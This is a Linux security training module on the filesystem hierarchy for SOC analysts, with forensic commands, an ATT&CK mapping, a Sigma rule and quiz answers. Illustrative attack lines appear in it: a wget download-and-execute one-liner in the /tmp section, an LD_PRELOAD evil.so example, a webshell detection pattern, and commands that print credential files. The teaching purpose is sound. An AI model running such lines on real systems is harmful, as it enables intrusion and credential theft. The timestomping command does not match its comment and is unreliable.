# Linux/01 — Filesystem Hierarchy

> The Linux filesystem is not a storage convention. It is a live interface to the kernel, process state, hardware, and runtime configuration. Every directory exists for a reason. Understanding those reasons is what separates a security engineer from someone who uses tools.

![MITRE](https://img.shields.io/badge/MITRE-T1005%20|%20T1083%20|%20T1552%20|%20T1564-red)
![OS](https://img.shields.io/badge/Platform-Linux-orange)

---

## The Filesystem as a Security Surface

The Filesystem Hierarchy Standard (FHS) defines where things live on a Linux system. Attackers know this. They know where credentials are stored, where configs live, where binaries run from, and — critically — where they can write without immediately triggering detection.

A security engineer uses this same knowledge to answer three questions during any investigation:

```
Where would an attacker write to establish persistence?
Where would stolen data or staged exfiltration live?
What changed on disk that shouldn't have?
```

---

## Full Root Directory Dissection

### `/` — Root

The top of the VFS (Virtual Filesystem). Everything in Linux is a file — devices, processes, sockets, kernel parameters. The root filesystem is mounted first at boot. Its integrity is foundational to every security control above it.

**Security significance:** If an attacker controls what gets mounted at `/`, they control the entire system's view of reality. This is why bootloader integrity and Secure Boot matter.

---

### `/bin` — Essential User Binaries

Core binaries required for the system to function in single-user mode and before `/usr` is mounted: `ls`, `cat`, `cp`, `mv`, `bash`, `sh`, `mount`, `ping`, `grep`, `find`.

On modern systemd-based distributions, `/bin` is a symlink to `/usr/bin`.

**Attacker use:** Replacing or patching binaries in `/bin` is a classic rootkit technique. A trojanized `ls` that hides files, a patched `ps` that omits processes — these are library preload or binary replacement attacks.

**Defender action:**
- File integrity monitoring (FIM) on `/bin` is non-negotiable
- Baseline hashes on installation, alert on any change
- Commands to validate:

```bash
# Hash all binaries in /bin
find /bin -type f -exec md5sum {} \; > /root/bin_baseline.txt

# Compare against baseline
md5sum -c /root/bin_baseline.txt 2>&1 | grep FAILED

# Verify package integrity (Debian/Ubuntu)
debsums -c

# Verify package integrity (RHEL/CentOS)
rpm -Va | grep "^..5" | grep /bin
```

---

### `/sbin` — System Administration Binaries

Binaries for root-level system administration: `iptables`, `ip`, `ifconfig`, `fdisk`, `fsck`, `init`, `reboot`, `shutdown`, `useradd`, `userdel`, `modprobe`, `insmod`, `rmmod`.

Symlinked to `/usr/sbin` on modern systems.

**Attacker use:** A compromised `iptables` binary could silently accept traffic it appears to block. A backdoored `useradd` could create an additional hidden account.

**Key monitoring target:** Execution of `insmod` or `modprobe` outside of expected system update windows — these load kernel modules and are a rootkit insertion vector.

```bash
# Monitor kernel module loading
auditctl -w /sbin/insmod -p x -k kernel_module_load
auditctl -w /sbin/modprobe -p x -k kernel_module_load

# List currently loaded modules
lsmod

# Get detail on a specific module
modinfo <module_name>
```

---

### `/usr` — Unix System Resources

The largest directory on most systems. Contains the majority of installed software, libraries, documentation, and system utilities.

```
/usr/bin        User-accessible binaries (gcc, python, curl, wget, nc, ssh)
/usr/sbin       Admin binaries not needed at boot
/usr/lib        Shared libraries (.so files) for /usr/bin and /usr/sbin
/usr/lib64      64-bit libraries on multi-arch systems
/usr/local/     Locally compiled software (outside package manager)
/usr/share/     Architecture-independent data, man pages, locale
/usr/include/   C/C++ header files
/usr/src/       Kernel source (if installed)
```

**Attacker use of `/usr/local/`:** Software in `/usr/local/` is installed outside the package manager. A binary dropped here is invisible to `dpkg -l` or `rpm -qa`. Attackers use this to install tools or backdoors that survive package integrity checks.

**Attacker use of shared libraries:** Malicious `.so` files placed in `/usr/lib/` or `/usr/local/lib/` and referenced via `LD_PRELOAD` or `ldconfig` can intercept and modify the behavior of any dynamically linked binary.

```bash
# Find recently modified files in /usr (last 7 days)
find /usr -type f -mtime -7 -ls 2>/dev/null

# Check for unexpected files in /usr/local/bin
ls -la /usr/local/bin/

# Examine dynamic linker config
cat /etc/ld.so.conf
cat /etc/ld.so.conf.d/*

# Check for LD_PRELOAD in environment
env | grep LD_PRELOAD
cat /etc/environment | grep LD_PRELOAD
```

---

### `/lib` and `/lib64` — Core Shared Libraries

Essential shared libraries required by binaries in `/bin` and `/sbin` at boot time. Contains the dynamic linker (`ld-linux.so`), C standard library (`libc.so`), and kernel modules.

```
/lib/modules/<kernel-version>/    Kernel modules (.ko files)
/lib/x86_64-linux-gnu/            Architecture-specific libraries
```

**Attacker use — LD_PRELOAD hijacking:** The dynamic linker loads libraries listed in `LD_PRELOAD` before all others. A malicious library here intercepts calls to legitimate system functions — hiding files, processes, network connections — without touching the original binary.

```bash
# Example: attacker plants malicious library
export LD_PRELOAD=/tmp/.hidden/evil.so
# Now every dynamically-linked program loads evil.so first

# Detection: look for LD_PRELOAD in /etc/environment, /etc/ld.so.preload
cat /etc/ld.so.preload           # Should be empty on clean system
ls -la /etc/ld.so.preload        # Note modification time

# List all loaded libraries for a running process
cat /proc/<pid>/maps | grep '\.so'
ldd /bin/bash
```

---

### `/etc` — System Configuration

The central configuration directory. Every service, every daemon, every system parameter has a configuration file here. This directory is the most forensically rich location on a Linux system outside of `/var/log`.

**Critical files for security investigation:**

```
/etc/passwd          User accounts (username, UID, GID, home, shell)
/etc/shadow          Password hashes (root-readable only)
/etc/group           Group membership
/etc/sudoers         Sudo privilege configuration
/etc/sudoers.d/      Modular sudo rules
/etc/ssh/sshd_config SSH daemon configuration
/etc/ssh/authorized_keys  (per-user: ~/.ssh/authorized_keys)
/etc/hosts           Static hostname resolution
/etc/resolv.conf     DNS resolver configuration
/etc/nsswitch.conf   Name service switch — resolution order
/etc/pam.d/          PAM authentication stack configuration
/etc/cron.d/         System cron jobs
/etc/cron.daily/     Daily cron scripts
/etc/cron.weekly/    Weekly cron scripts
/etc/cron.monthly/   Monthly cron scripts
/etc/crontab         System-level crontab
/etc/profile         System-wide shell profile
/etc/profile.d/      Modular profile scripts (executed at login)
/etc/bashrc          System-wide bash config
/etc/environment     System-wide environment variables
/etc/ld.so.preload   Libraries pre-loaded for every process
/etc/ld.so.conf      Dynamic linker config
/etc/rsyslog.conf    Logging daemon configuration
/etc/auditd.conf     Audit daemon configuration
/etc/audit/rules.d/  Auditd rules
/etc/systemd/system/ Systemd unit files (persistence vector)
/etc/init.d/         SysV init scripts (legacy, still present)
/etc/rc.local        Legacy startup script (persistence vector)
/etc/modules         Kernel modules to load at boot
/etc/modprobe.d/     Module loading configuration
/etc/hosts.allow     TCP wrappers allow rules
/etc/hosts.deny      TCP wrappers deny rules
```

**Investigation commands:**

```bash
# Check for recently modified config files (last 24 hours)
find /etc -type f -mtime -1 -ls 2>/dev/null

# Look for unauthorized sudoers entries
cat /etc/sudoers
ls -la /etc/sudoers.d/
grep -v "^#\|^$" /etc/sudoers

# Check sshd config for dangerous settings
grep -E "PermitRootLogin|PasswordAuthentication|AllowUsers|DenyUsers|AuthorizedKeysFile" /etc/ssh/sshd_config

# Check for rogue authorized_keys
find / -name "authorized_keys" 2>/dev/null -exec ls -la {} \;
find / -name "authorized_keys" 2>/dev/null -exec cat {} \;

# Check PAM config for backdoors
grep -r "pam_exec\|pam_python" /etc/pam.d/

# Check /etc/ld.so.preload
cat /etc/ld.so.preload

# Check crontabs for persistence
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
for user in $(cut -d: -f1 /etc/passwd); do crontab -l -u $user 2>/dev/null; done
```

---

### `/var` — Variable Data

Data that changes during normal system operation. This is where logs, databases, mail spools, caches, and runtime state live.

```
/var/log/           System and application logs
/var/log/auth.log   Authentication events (SSH, sudo, PAM)
/var/log/syslog     General system messages
/var/log/kern.log   Kernel messages
/var/log/cron.log   Cron job execution
/var/log/wtmp       Binary: all login/logout sessions
/var/log/btmp       Binary: failed login attempts
/var/log/lastlog    Binary: last login per user
/var/log/audit/     auditd logs (if enabled)
/var/log/journal/   systemd journal (binary format)
/var/spool/cron/    Per-user crontabs
/var/spool/mail/    Local mail
/var/tmp/           Persistent temp (survives reboots — attacker staging area)
/var/lib/           Application state databases
/var/run/ → /run/   PIDs, sockets, lock files (runtime state)
```

**`/var/tmp` — critical attacker staging area:** Unlike `/tmp` which is cleared on reboot, `/var/tmp` persists. Attackers use it to stage tools, store exfiltrated data, or plant scripts that are executed later.

```bash
# Check /var/tmp for suspicious files
ls -laRt /var/tmp/
find /var/tmp -type f -exec file {} \;
find /var/tmp -type f -newer /var/log/syslog

# Read binary logs
last -F              # Full timestamp login history from wtmp
lastb               # Failed logins from btmp
lastlog             # Last login per user

# Check journal logs (systemd)
journalctl -n 200 --no-pager
journalctl _COMM=sshd --since "1 hour ago"

# Look for log gaps (missing time = evidence of tampering)
ls -la /var/log/auth.log*
stat /var/log/auth.log
```

---

### `/tmp` — Temporary Files

World-writable scratch space. Any process, any user can write here. Cleared on reboot (usually mounted as tmpfs in memory).

**This is one of the most actively abused directories on Linux systems.**

Common attacker uses:
- Downloading and executing payloads (`wget http://... -O /tmp/x && chmod +x /tmp/x && /tmp/x`)
- Staging compiled exploits
- Writing reverse shell scripts
- Storing output from reconnaissance commands

```bash
# Monitor /tmp for suspicious activity
ls -laRt /tmp/

# Find executables in /tmp (major red flag)
find /tmp -type f -perm /111 -exec file {} \;
find /tmp -name "*.sh" -o -name "*.py" -o -name "*.elf" 2>/dev/null

# Find hidden files (dotfiles) in /tmp
find /tmp -name ".*"

# Check what processes have files open in /tmp
lsof +D /tmp 2>/dev/null

# auditd rule to monitor /tmp execution
auditctl -w /tmp -p x -k tmp_execution
```

---

### `/proc` — Process and Kernel State Interface

Not a filesystem in the traditional sense. `/proc` is a virtual filesystem (procfs) maintained by the kernel that exposes live system state. Nothing in `/proc` exists on disk.

```
/proc/<pid>/        Directory for each running process
/proc/<pid>/exe     Symlink to the process executable
/proc/<pid>/cmdline Full command line used to launch the process
/proc/<pid>/maps    Memory map — which files and libraries are loaded
/proc/<pid>/fd/     File descriptors open by the process
/proc/<pid>/net/    Network state as seen by the process
/proc/<pid>/environ Environment variables at process launch
/proc/<pid>/status  Process state, UID, GID, memory usage
/proc/self/         Shortcut — refers to the calling process
/proc/net/tcp       All TCP connections (kernel perspective)
/proc/net/tcp6      IPv6 TCP connections
/proc/net/udp       UDP sockets
/proc/net/unix      Unix domain sockets
/proc/sys/          Kernel tunable parameters
/proc/sys/net/      Network stack parameters
/proc/sys/kernel/   Core kernel parameters
/proc/modules       Loaded kernel modules
/proc/mounts        Currently mounted filesystems
/proc/meminfo       Memory usage statistics
/proc/cpuinfo       CPU information
/proc/version       Kernel version
/proc/uptime        System uptime
```

**Forensic power of `/proc`:** During a live investigation, `/proc` gives you the current state of every running process — including processes whose binary has been deleted from disk. An attacker who deletes their binary after execution leaves the process running, but the binary path in `/proc/<pid>/exe` will show `(deleted)`.

```bash
# Find processes whose binary has been deleted from disk
ls -la /proc/*/exe 2>/dev/null | grep deleted

# Recover the deleted binary from memory
cp /proc/<pid>/exe /tmp/recovered_binary
file /tmp/recovered_binary

# Inspect process environment (may contain credentials)
cat /proc/<pid>/environ | tr '\0' '\n'

# See what files a process has open
ls -la /proc/<pid>/fd/

# Read full command line
cat /proc/<pid>/cmdline | tr '\0' ' '

# Network connections from kernel's perspective (bypass userspace tools)
cat /proc/net/tcp
cat /proc/net/tcp6

# Compare /proc/net/tcp with ss output (rootkit detection)
# If entries differ, a rootkit may be hiding connections
```

---

### `/sys` — Kernel and Hardware Interface

Another virtual filesystem (sysfs). Exposes kernel objects, device drivers, and hardware parameters in a structured hierarchy. Unlike `/proc` which is process-oriented, `/sys` is device and driver oriented.

```
/sys/class/net/       Network interface information
/sys/class/block/     Block device information
/sys/module/          Loaded kernel modules and their parameters
/sys/kernel/          Core kernel parameters
/sys/devices/         Hardware device tree
/sys/bus/             Bus types (PCI, USB, etc.)
```

**Security significance:** `/sys/module/` exposes every loaded kernel module. Comparing this with `lsmod` output and `/proc/modules` is a rootkit detection technique — a sophisticated rootkit may manipulate one source but not all three.

```bash
# List loaded modules from /sys
ls /sys/module/

# Compare three sources for rootkit detection
lsmod | awk 'NR>1{print $1}' | sort > /tmp/lsmod.txt
cat /proc/modules | awk '{print $1}' | sort > /tmp/proc_modules.txt
ls /sys/module/ | sort > /tmp/sys_modules.txt
diff /tmp/lsmod.txt /tmp/proc_modules.txt
diff /tmp/lsmod.txt /tmp/sys_modules.txt
# Any differences = investigate
```

---

### `/dev` — Device Files

Every hardware device on a Linux system is represented as a file in `/dev`. The kernel provides device drivers that translate file operations (read/write) into hardware operations.

```
/dev/null       Discard all writes, reads return EOF (attacker use: suppress output)
/dev/zero       Infinite stream of null bytes (used in disk wiping)
/dev/random     Cryptographically secure random bytes
/dev/urandom    Non-blocking random bytes
/dev/mem        Direct access to physical memory (dangerous — usually restricted)
/dev/kmem       Kernel memory (usually absent on modern systems)
/dev/sda        First SATA/SCSI disk
/dev/sda1       First partition of first disk
/dev/tty        Controlling terminal
/dev/pts/       Pseudo-terminal slaves (SSH sessions, terminal emulators)
/dev/shm/       POSIX shared memory (RAM-backed, no disk writes)
```

**`/dev/shm` — attacker staging in RAM:** `/dev/shm` is memory-backed shared memory. Files written here never touch disk. This is used by sophisticated attackers and malware to execute payloads entirely in memory, leaving no disk artifacts.

```bash
# Check /dev/shm for suspicious files
ls -la /dev/shm/
find /dev/shm -type f -exec file {} \;

# Check for processes with files open in /dev/shm
lsof +D /dev/shm 2>/dev/null

# Monitor /dev/pts for unusual terminal sessions
ls -la /dev/pts/
who    # See which pts devices are in use

# /dev/null abuse (attacker redirecting all output)
# Look for commands like: cmd > /dev/null 2>&1 &
grep "/dev/null" /var/log/auth.log
grep "/dev/null" /etc/cron.d/*
```

---

### `/home` — User Home Directories

Each user's personal space. Contains shell config files, SSH keys, browser history, application data, and anything the user has created.

```
~/.bashrc              Bash config executed per interactive shell
~/.bash_profile        Executed at login shell start
~/.bash_history        Command history (attacker target for clearing)
~/.profile             Generic shell profile
~/.ssh/                SSH directory
~/.ssh/authorized_keys  Keys allowed to authenticate as this user
~/.ssh/known_hosts     Previously connected SSH hosts
~/.ssh/id_rsa          Private SSH key (credential theft target)
~/.gnupg/              GPG keys
~/.aws/                AWS credentials (T1552.005)
~/.config/             Application configuration
~/.local/              User-local application data and binaries
~/.local/bin/          User binaries (writable, in PATH on many distros)
~/.bashrc.d/           Modular bash config (persistence vector)
```

**`~/.local/bin/` persistence:** On many modern Linux distributions (Ubuntu, Fedora), `~/.local/bin/` is in the default user PATH. An attacker who plants a script here with a name matching a common command (`ls`, `cat`, `python`) achieves user-level persistence without touching system directories.

```bash
# Check all user home directories for suspicious files
for user_home in /home/* /root; do
    echo "=== $user_home ==="
    ls -la "$user_home"
    ls -la "$user_home/.ssh/" 2>/dev/null
    cat "$user_home/.bash_history" 2>/dev/null | tail -50
    crontab -l -u "$(basename $user_home)" 2>/dev/null
done

# Find recently modified files in home directories
find /home /root -type f -mtime -7 -ls 2>/dev/null

# Check for credential files
find /home /root -name "*.pem" -o -name "id_rsa" -o -name "*.key" -o -name "credentials" 2>/dev/null
find /home /root -path "*/.aws/credentials" 2>/dev/null -exec cat {} \;
find /home /root -path "*/.ssh/authorized_keys" 2>/dev/null -exec cat {} \;

# Check bash_history for all users
find /home /root -name ".bash_history" -exec echo "=== {} ===" \; -exec cat {} \;
```

---

### `/root` — Root User Home

The root user's home directory. Separate from `/home` to ensure root's environment is available even if `/home` is on a separate unmounted partition.

**High-value forensic target:** Root's bash history, SSH keys, and cron jobs are critical during any IR engagement involving privilege escalation.

```bash
ls -la /root/
cat /root/.bash_history
cat /root/.ssh/authorized_keys 2>/dev/null
crontab -l -u root
ls -la /root/.ssh/
```

---

### `/boot` — Boot Loader and Kernel Files

Files required to boot the system before the root filesystem is mounted.

```
/boot/grub/           GRUB bootloader files
/boot/grub/grub.cfg   GRUB configuration
/boot/vmlinuz-*       Compressed kernel image
/boot/initrd.img-*    Initial RAM disk (early userspace)
/boot/System.map-*    Kernel symbol table
/boot/config-*        Kernel build configuration
```

**Security significance:** Modifying GRUB config or replacing the kernel image achieves bootkit-level persistence. Monitoring `/boot` for changes is part of a complete FIM strategy.

```bash
# Hash all files in /boot as baseline
find /boot -type f -exec sha256sum {} \; > /root/boot_baseline.txt

# Check for recent modifications
find /boot -type f -mtime -7 -ls

# Verify GRUB config
cat /boot/grub/grub.cfg | grep -E "menuentry|linux|initrd"
```

---

### `/opt` — Optional Software

Software installed outside the standard package manager hierarchy. Third-party commercial software, security tools, and monitoring agents typically live here.

**Attacker use:** `/opt` is rarely monitored as aggressively as `/bin` or `/usr`. Attackers may install backdoors here under legitimate-sounding directory names.

```bash
# Inventory /opt
ls -la /opt/
find /opt -type f -executable -ls
find /opt -type f -mtime -7 -ls
```

---

### `/srv` — Service Data

Data served by services running on the system (web server content, FTP data). Often empty on systems that don't run public services.

**Attack surface:** A compromised web server may have attacker-uploaded webshells in `/srv/www/` or `/var/www/`.

```bash
# Find PHP/ASPX/JSP webshells
find /srv /var/www /opt -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" \) \
  -exec grep -l "eval\|base64_decode\|system\|passthru\|shell_exec" {} \;
```

---

### `/run` — Runtime State

Replaces the older `/var/run`. Holds volatile runtime data: PID files, Unix domain sockets, lock files. Mounted as tmpfs — cleared on every boot.

```
/run/systemd/         systemd runtime state
/run/sshd.pid         SSH daemon PID
/run/lock/            Lock files
/run/user/<uid>/      Per-user runtime directory
```

---

### `/media` and `/mnt` — Mount Points

```
/media/    Automounted removable media (USB drives, CD-ROMs)
/mnt/      Manual temporary mount points
```

**Security significance:** USB insertion and external drive mounting create forensic artifacts. Check `/var/log/syslog` for mount events. In a data exfiltration scenario, USB mounts are a key indicator.

```bash
# Check current mounts
mount | grep -v "proc\|sys\|dev\|tmpfs"
cat /proc/mounts

# Check for USB insertion events in syslog
grep -i "usb\|removable\|new.*device" /var/log/syslog
```

---

## Filesystem-Level Forensics

### Timeline Analysis

```bash
# Find all files modified in the last 24 hours (exclude /proc /sys /dev)
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o \
  -type f -mtime -1 -printf "%TY-%Tm-%Td %TT %p\n" 2>/dev/null | sort

# Find SUID/SGID binaries
find / -type f \( -perm -4000 -o -perm -2000 \) -ls 2>/dev/null

# Find world-writable directories
find / -type d -perm -0002 -not -path "/proc/*" -ls 2>/dev/null

# Find files with no owner (orphaned — attacker may have deleted their user)
find / -nouser -nogroup -not -path "/proc/*" -ls 2>/dev/null
```

### Inode Timestamps (MAC Times)

Every file on Linux has three timestamps:
- **mtime** — last content modification
- **atime** — last access
- **ctime** — last metadata change (permissions, ownership)

```bash
# View all three timestamps
stat /path/to/file

# Find files modified but with matching ctime and mtime
# (timestomping — attacker manipulated mtime but forgot ctime)
find /etc -type f -newer /etc/shadow 2>/dev/null
```

### Hidden Files and Directories

```bash
# Find hidden files (dotfiles) in unexpected locations
find /tmp /var/tmp /dev/shm /opt /srv -name ".*" -ls 2>/dev/null

# Find files with unusual permissions
find / -type f -perm 777 -not -path "/proc/*" -ls 2>/dev/null
```

---

## MITRE ATT&CK Mapping

| Technique | ID | Directory Involved |
|-----------|----|--------------------|
| Data from Local System | T1005 | `/home`, `/root`, `/etc`, `/var` |
| File and Directory Discovery | T1083 | All |
| Unsecured Credentials — Files | T1552.001 | `/home/*/.aws`, `/home/*/.ssh`, `/etc` |
| Masquerading | T1036 | `/tmp`, `/var/tmp`, `/dev/shm` |
| Hide Artifacts | T1564 | `/tmp/.*`, `/dev/shm/.*`, `/var/tmp/.*` |
| Indicator Removal — File Deletion | T1070.004 | `/var/log`, `/tmp` |
| LD_PRELOAD | T1574.006 | `/etc/ld.so.preload`, `/lib`, `/usr/lib` |
| Kernel Modules | T1547.006 | `/lib/modules`, `/sbin/insmod` |
| SSH Authorized Keys | T1098.004 | `~/.ssh/authorized_keys` |
| Cron Persistence | T1053.003 | `/etc/cron.d`, `/var/spool/cron` |
| Systemd Service | T1543.002 | `/etc/systemd/system` |
| Boot or Logon Init Scripts | T1037.004 | `/etc/rc.local`, `/etc/profile.d` |

---

## Sigma — Suspicious File Creation in /dev/shm

```yaml
title: File Written to Linux Shared Memory Directory
id: f7ab2e91-4c3d-4b8e-a12f-3e9c7d5f1a02
status: stable
description: >
  Detects file creation or modification in /dev/shm.
  This memory-backed directory leaves no disk artifacts,
  making it a preferred staging location for in-memory payloads.
author: Solomon James (@Jaysolex)
date: 2024/01/01
tags:
  - attack.defense_evasion
  - attack.t1564
  - attack.execution
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: PATH
    name|startswith: '/dev/shm/'
    nametype:
      - CREATE
      - NORMAL
  condition: selection
falsepositives:
  - Legitimate IPC using POSIX shared memory (verify process context)
  - Chrome/Electron apps use /dev/shm for rendering
level: medium
fields:
  - uid
  - pid
  - name
  - exe
```

---

## Practitioner Notes

**On `/tmp` vs `/dev/shm`:** Forensically, files in `/dev/shm` are harder to recover because they are RAM-backed. If a system is powered off before acquisition, `/dev/shm` content is lost. Always acquire memory before powering down a suspected compromised system.

**On deleted executables:** A process whose binary was deleted from disk but is still running shows `(deleted)` in its `/proc/<pid>/exe` symlink. You can recover the binary by copying from `/proc/<pid>/exe`. This is a common technique used by attackers who want to clean up after themselves — the process runs in memory while the binary is removed from disk.

**On atime:** Many modern systems mount filesystems with `noatime` or `relatime` to reduce disk I/O. This means file access time may not be reliable as a forensic indicator on all systems. Always check `/proc/mounts` to understand mount options before relying on atime.

**On FIM baseline timing:** File integrity monitoring is only useful if the baseline was taken from a known-clean state. A baseline taken after a compromise just documents the compromised state. Establish baselines at deployment, store them offline.

---

## Knowledge Validation

**What is the forensic significance of a process showing `(deleted)` in `/proc/<pid>/exe`?**  
The process binary was deleted from disk after execution. The process continues to run in memory. The deleted binary can be recovered by copying `/proc/<pid>/exe`. This technique is used to eliminate disk-based IOCs while maintaining a running payload.

**An attacker plants a binary in `/usr/local/bin/ls`. Why does this evade package manager integrity checks?**  
Package managers (`dpkg`, `rpm`) only track files they installed. `/usr/local/` is explicitly excluded from package manager management. A binary there is invisible to `debsums -c` or `rpm -Va`.

**Why is `/dev/shm` preferred over `/tmp` for in-memory staging?**  
`/dev/shm` is a tmpfs mount backed by RAM. Writes never touch disk. If the system is powered off before memory acquisition, content is lost permanently. `/tmp` is also often tmpfs but may have disk-backed swap, leaving partial artifacts.

**What three sources can you cross-reference to detect a rootkit hiding kernel modules?**  
`lsmod`, `/proc/modules`, and `/sys/module/`. A rootkit manipulating userspace tools may miss one of these kernel-exposed sources.

**An authorized_keys file was modified on a server at 3 AM. What is your investigation sequence?**  
(1) Determine which user's `authorized_keys` was modified and what key was added. (2) Check `/var/log/auth.log` for SSH logins around that time — both successful and failed. (3) Review `/proc/net/tcp` and `ss -tnap` for current connections. (4) Check `last` and `lastlog` for the account. (5) Review `/var/log/audit/audit.log` for the write syscall on the authorized_keys file to identify which process wrote it. (6) Check if any cron jobs or systemd units were added around the same time.

---

*Linux/01-Filesystem-Hierarchy | OS-Internals-for-SOC | Solomon James (@Jaysolex)*
